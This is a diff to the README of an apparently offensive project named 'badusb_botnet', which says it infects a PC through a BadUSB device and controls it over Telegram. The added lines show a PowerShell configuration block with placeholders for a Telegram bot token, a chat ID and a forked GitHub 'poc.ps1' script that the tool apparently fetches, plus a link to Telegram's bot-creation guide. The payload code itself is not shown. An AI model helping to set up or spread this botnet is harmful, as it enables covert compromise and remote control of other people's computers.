@@ -1,6 +1,19 @@
 # badusb_botnet
 :smiling_imp::busts_in_silhouette: Infect a pc with badusb and establish a connection through telegram.
 
+> You most change this lines:
+
+```powershell
+############
+## CONFIG ##
+############
+
+$BotToken = "<BOTTOKEN>"
+$ChatID = '<CHATID>'
+$githubScript = '<you_fork/poc.ps1>'
+```
+*To create a telegram bot: https://core.telegram.org/bots#6-botfather*
+
 ## Option 1
 
 ```
